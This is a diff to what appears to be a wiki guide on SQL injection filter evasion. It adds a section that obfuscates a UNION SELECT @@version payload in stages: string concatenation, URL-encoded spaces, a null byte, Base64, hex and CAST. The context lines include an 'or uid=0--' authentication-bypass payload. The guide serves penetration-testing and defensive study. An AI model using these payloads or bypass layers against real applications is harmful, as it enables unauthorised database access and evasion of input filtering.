@@ -8,11 +8,11 @@ Another subcategory of encoding attacks is the CAST and CONVERT attack. The CAST
 
 Using CAST:  
 
-  CAST ( expression AS data_type )
+  _CAST ( expression AS data_type )_
 
 Using CONVERT: 
 
-  CONVERT ( data_type [ ( length ) ] , expression [ , style ] )
+  _CONVERT ( data_type [ ( length ) ] , expression [ , style ] )_
 
 With CAST and CONVERT you have similar filtering by passing results with with the function SUBSTRING, an example can show you what I mean. The following SQL queries will return the same result back:
 
@@ -113,3 +113,64 @@ which is presumably always false, or where 1 = 1, which is always true. Hence, t
 or uid=0-- 
 
 *Note:* This query is considered to be a very old technique used for authentication bypass or privilege escalation.
+
+== Using multiple layers of payload obfuscation ==
+
+In order to bypass complex SQL injection filters you might have to use multiple layers of obfuscation. Some examples below can make you understand what I mean:
+
+  * *Original payload*
+
+' union (select @@version) --
+
+  * *First example*
+
+Layer 1: Dynamic query execution using concatenations  
+
+' uni'+'on (se'+'lect @@ver'+'sion) --
+
+Layer 2: Space filling using url encoded space %20
+
+' uni'+'on%20(se'+'lect%20@@ver'+'sion)%20--
+
+Layer 3: Null byte bypass added as a postfix
+
+' uni'+'on%20(se'+'lect%20@@ver'+'sion)%20--%00
+
+  * *Second example*
+
+Layer 1: Dynamic query execution using concatenations  
+
+' uni'+'on (se'+'lect @@ver'+'sion) --
+
+Layer 2: Space filling using url encoded space %20
+
+' uni'+'on%20(se'+'lect%20@@ver'+'sion)%20--
+
+Layer 3: Base 64 encoding
+
+JyB1bmknKydvbiUyMChzZScrJ2xlY3QlMjBAQHZlcicrJ3Npb24pJTIwLS0=
+
+  * *Third example*
+
+Layer 1: Dynamic query execution using concatenations  
+
+' uni'+'on (se'+'lect @@ver'+'sion) --
+
+Layer 2: Space filling using url encoded space %20
+
+' uni'+'on%20(se'+'lect%20@@ver'+'sion)%20--
+
+Layer 3: Ascii hex encode
+
+2720756e69272b276f6e253230287365272b276c6563742532304040766572272b2773696f6e292532302d2d
+
+Layer 4: CAST mutation
+
+SET @sqlcommand =  (SELECT CAST(0x2720756e69272b276f6e253230287365272b276c6563742532304040766572272b2773696f6e292532302d2d AS VARCHAR(length))
+
+*Note:* The mutation layers should be applied in such a way so as not to break the SQL injection payload.
+
+
+
+
+ 
